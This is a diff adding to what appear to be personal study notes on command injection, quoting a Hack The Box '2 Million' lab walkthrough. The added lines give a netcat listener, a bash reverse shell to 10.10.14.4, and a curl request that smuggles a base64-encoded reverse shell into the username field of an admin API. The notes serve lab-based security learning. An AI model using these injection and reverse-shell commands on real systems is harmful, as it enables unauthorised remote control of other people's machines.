@@ -104,3 +104,22 @@ C:\htb> who^ami
 > 
 > It is easier to perform injection in the to param cause it happens later in the linux command
 
+
+# From 2 Million
+The command is successful and we gain command execution. Let's start a Netcat listener to catch a shell. 
+
+```
+nc -lvp 1234 
+```
+
+We can then get a shell with the following payload. 
+
+```
+bash -i >& /dev/tcp/10.10.14.4/1234 0>&1 
+```
+
+We encode the payload in Base64 and add it to the following command. 
+
+```
+curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=nufb0km8892s1t9kraqhqiecj6" --header "Content-Type: application/json" --data '{"username":"test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQo= | base64 -d | bash;"}'
+```
